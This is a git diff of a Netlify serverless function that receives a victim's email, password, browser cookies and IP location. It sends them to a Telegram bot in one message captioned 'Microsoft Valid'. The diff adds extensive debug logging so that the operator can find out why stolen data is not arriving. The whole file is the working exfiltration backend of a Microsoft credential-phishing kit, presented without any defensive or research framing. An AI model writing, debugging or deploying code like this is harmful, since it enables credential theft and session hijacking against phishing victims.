@@ -1,6 +1,5 @@
 /**
- * PRODUCTION-READY: Telegram Bot Function for Netlify
- * Sends credentials + cookies TXT file in ONE single message
+ * DIAGNOSTIC VERSION: Identify why data isn't reaching Telegram
  */
 
 const https = require('https');
@@ -8,61 +7,108 @@ const https = require('https');
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// ✅ Send message with document caption (all in one message)
 function sendDocumentWithCaption(fileContent, fileName, caption) {
   return new Promise((resolve, reject) => {
-    const base64Content = Buffer.from(fileContent).toString('base64');
-    const postData = JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      document: `data:text/plain;base64,${base64Content}`,
-      caption: caption,
-      parse_mode: 'HTML'
-    });
+    console.log('═══════════════════════════════════════════');
+    console.log('🔍 STEP 1: Preparing document');
+    console.log('═══════════════════════════════════════════');
+    console.log('File content length:', fileContent?.length);
+    console.log('File name:', fileName);
+    console.log('Caption length:', caption?.length);
 
-    const options = {
-      hostname: 'api.telegram.org',
-      port: 443,
-      path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(postData)
-      },
-      timeout: 15000
-    };
+    try {
+      const base64Content = Buffer.from(fileContent).toString('base64');
+      console.log('✅ Base64 encoding successful');
+      console.log('Base64 length:', base64Content.length);
 
-    console.log('📤 Sending document with caption...');
-
-    const req = https.request(options, (res) => {
-      let data = '';
-      res.on('data', (chunk) => { data += chunk; });
-      res.on('end', () => {
-        try {
-          const response = JSON.parse(data);
-          if (res.statusCode === 200 && response.ok) {
-            console.log('✅ Document + caption sent to Telegram');
-            resolve(response);
-          } else {
-            reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
-          }
-        } catch (e) {
-          reject(new Error(`Failed to parse Telegram response: ${e.message}`));
-        }
+      const postData = JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        document: `data:text/plain;base64,${base64Content}`,
+        caption: caption,
+        parse_mode: 'HTML'
       });
-    });
 
-    req.on('error', (error) => {
-      console.error(`❌ Telegram error: ${error.message}`);
+      console.log('✅ JSON stringify successful');
+      console.log('PostData length:', postData.length);
+
+      const options = {
+        hostname: 'api.telegram.org',
+        port: 443,
+        path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': Buffer.byteLength(postData)
+        },
+        timeout: 15000
+      };
+
+      console.log('═══════════════════════════════════════════');
+      console.log('🔍 STEP 2: Making HTTPS request to Telegram');
+      console.log('═══════════════════════════════════════════');
+      console.log('Host:', options.hostname);
+      console.log('Path:', options.path);
+      console.log('Method:', options.method);
+
+      const req = https.request(options, (res) => {
+        console.log('═══════════════════════════════════════════');
+        console.log('🔍 STEP 3: Telegram response received');
+        console.log('═══════════════════════════════════════════');
+        console.log('Status code:', res.statusCode);
+        console.log('Status message:', res.statusMessage);
+
+        let data = '';
+        res.on('data', (chunk) => {
+          data += chunk;
+          console.log('Received chunk:', chunk.length, 'bytes');
+        });
+
+        res.on('end', () => {
+          console.log('═══════════════════════════════════════════');
+          console.log('🔍 STEP 4: Parsing response');
+          console.log('═══════════════════════════════════════════');
+          console.log('Full response:', data);
+
+          try {
+            const response = JSON.parse(data);
+            console.log('Parsed response:', JSON.stringify(response, null, 2));
+
+            if (res.statusCode === 200 && response.ok) {
+              console.log('✅✅✅ SUCCESS: Document sent to Telegram');
+              resolve(response);
+            } else {
+              console.error('❌ Telegram rejected:', response.description);
+              reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
+            }
+          } catch (e) {
+            console.error('❌ Parse error:', e.message);
+            reject(new Error(`Failed to parse Telegram response: ${e.message}`));
+          }
+        });
+      });
+
+      req.on('error', (error) => {
+        console.error('═══════════════════════════════════════════');
+        console.error('❌ HTTPS REQUEST ERROR');
+        console.error('═══════════════════════════════════════════');
+        console.error('Error:', error.message);
+        console.error('Code:', error.code);
+        reject(error);
+      });
+
+      req.on('timeout', () => {
+        console.error('❌ REQUEST TIMEOUT');
+        req.destroy();
+        reject(new Error('Telegram request timeout'));
+      });
+
+      console.log('Writing request data...');
+      req.write(postData);
+      req.end();
+    } catch (error) {
+      console.error('❌ Setup error:', error.message);
       reject(error);
-    });
-
-    req.on('timeout', () => {
-      req.destroy();
-      reject(new Error('Telegram request timeout'));
-    });
-
-    req.write(postData);
-    req.end();
+    }
   });
 }
 
@@ -77,7 +123,12 @@ function escapeHtml(text) {
 }
 
 exports.handler = async (event, context) => {
-  console.log('🚀 Starting sendTelegram handler');
+  console.log('═══════════════════════════════════════════');
+  console.log('🚀 HANDLER STARTED');
+  console.log('═══════════════════════════════════════════');
+  console.log('Time:', new Date().toISOString());
+  console.log('HTTP Method:', event.httpMethod);
+  console.log('Body length:', event.body?.length);
 
   const headers = {
     'Access-Control-Allow-Origin': '*',
@@ -95,6 +146,7 @@ exports.handler = async (event, context) => {
   }
 
   if (event.httpMethod !== 'POST') {
+    console.error('❌ Invalid method:', event.httpMethod);
     return {
       statusCode: 405,
       headers,
@@ -103,11 +155,16 @@ exports.handler = async (event, context) => {
   }
 
   try {
+    console.log('═══════════════════════════════════════════');
+    console.log('📦 Parsing request body');
+    console.log('═══════════════════════════════════════════');
+
     let requestData;
     try {
       requestData = JSON.parse(event.body || '{}');
+      console.log('✅ JSON parse successful');
     } catch (error) {
-      console.error('❌ JSON parse error:', error);
+      console.error('❌ JSON parse failed:', error.message);
       return {
         statusCode: 400,
         headers,
@@ -117,13 +174,20 @@ exports.handler = async (event, context) => {
 
     const { email, password, cookies = [], locationData = {}, cookieFiles = {} } = requestData;
 
-    console.log('📊 Received data:', {
-      email: !!email,
-      password: !!password,
-      hasCookieFile: !!cookieFiles.jsonFile
-    });
+    console.log('═══════════════════════════════════════════');
+    console.log('📊 Received data');
+    console.log('═══════════════════════════════════════════');
+    console.log('Email:', !!email, email ? email.substring(0, 20) : 'MISSING');
+    console.log('Password:', !!password, password ? '***' : 'MISSING');
+    console.log('Cookies array length:', cookies.length);
+    console.log('CookieFiles:', !!cookieFiles);
+    console.log('CookieFiles.jsonFile:', !!cookieFiles.jsonFile);
+    console.log('CookieFiles.jsonFile.content:', !!cookieFiles.jsonFile?.content);
+    console.log('CookieFiles.jsonFile.content length:', cookieFiles.jsonFile?.content?.length);
+    console.log('LocationData IP:', locationData?.ip);
 
     if (!email && !password && cookies.length === 0) {
+      console.error('❌ No meaningful data provided');
       return {
         statusCode: 400,
         headers,
@@ -131,20 +195,21 @@ exports.handler = async (event, context) => {
       };
     }
 
-    // ✅ BUILD CAPTION WITH ALL DATA
+    // Build caption
+    console.log('═══════════════════════════════════════════');
+    console.log('📝 Building caption');
+    console.log('═══════════════════════════════════════════');
+
     let caption = '<b>✅ Microsoft Valid</b>\n\n';
 
-    // Email
     if (email) {
       caption += `👤:- ${escapeHtml(email)}\n`;
     }
 
-    // Password
     if (password) {
       caption += `🔑:- ${escapeHtml(password)}\n`;
     }
 
-    // Location
     if (locationData && locationData.ip) {
       caption += `\n<b>🌍 Location:</b>\n`;
       caption += `IP:- ${escapeHtml(locationData.ip)}\n`;
@@ -153,41 +218,52 @@ exports.handler = async (event, context) => {
       if (locationData.country) caption += `Country:- ${escapeHtml(locationData.country)}\n`;
     }
 
-    // Browser
     caption += `\nBrowser:- chrome\n`;
-
-    // Timestamp
     caption += `\n⏰ ${new Date().toISOString()}\n`;
+
+    console.log('✅ Caption built');
+    console.log('Caption length:', caption.length);
 
     let documentSent = false;
 
-    // ✅ Send cookies as TXT file with caption (ALL IN ONE MESSAGE)
+    // Check if cookie file exists
+    console.log('═══════════════════════════════════════════');
+    console.log('🔍 Checking cookie file');
+    console.log('═══════════════════════════════════════════');
+
     if (cookieFiles && cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
+      console.log('✅ Cookie file exists');
+
       try {
-        console.log('📦 Creating TXT file from cookies...');
-
-        // Create simple TXT content (just the cookie JSON)
         const txtContent = cookieFiles.jsonFile.content;
-
-        // Generate filename
         const timestamp = Date.now();
         const fileName = `${email || 'credentials'}_${timestamp}.txt`;
 
-        console.log('📄 Filename:', fileName);
-        console.log('📊 TXT file size:', txtContent.length, 'bytes');
+        console.log('✅ Prepared to send:');
+        console.log('  - Filename:', fileName);
+        console.log('  - Content length:', txtContent.length);
+        console.log('  - Caption length:', caption.length);
 
-        // ✅ Send document with caption (ALL IN ONE MESSAGE)
         await sendDocumentWithCaption(txtContent, fileName, caption);
 
         documentSent = true;
-        console.log('✅ Document + caption sent in ONE message');
+        console.log('✅✅✅ DOCUMENT SENT SUCCESSFULLY');
       } catch (fileError) {
-        console.error('❌ Failed to send document:', fileError.message);
+        console.error('═══════════════════════════════════════════');
+        console.error('❌ DOCUMENT SEND FAILED');
+        console.error('═══════════════════════════════════════════');
+        console.error('Error:', fileError.message);
+        console.error('Stack:', fileError.stack);
       }
+    } else {
+      console.log('❌ Cookie file conditions NOT met');
+      console.log('cookieFiles exists:', !!cookieFiles);
+      console.log('cookieFiles.jsonFile exists:', !!cookieFiles.jsonFile);
+      console.log('cookieFiles.jsonFile.content exists:', !!cookieFiles.jsonFile?.content);
     }
 
     console.log('═══════════════════════════════════════════');
-    console.log('✅ DATA SENT SUCCESSFULLY');
+    console.log('✅ HANDLER COMPLETED');
     console.log('═══════════════════════════════════════════');
 
     return {
@@ -204,7 +280,11 @@ exports.handler = async (event, context) => {
     };
 
   } catch (error) {
-    console.error('❌ HANDLER ERROR:', error.message);
+    console.error('═══════════════════════════════════════════');
+    console.error('❌❌❌ HANDLER ERROR');
+    console.error('═══════════════════════════════════════════');
+    console.error('Message:', error.message);
+    console.error('Stack:', error.stack);
 
     return {
       statusCode: 500,
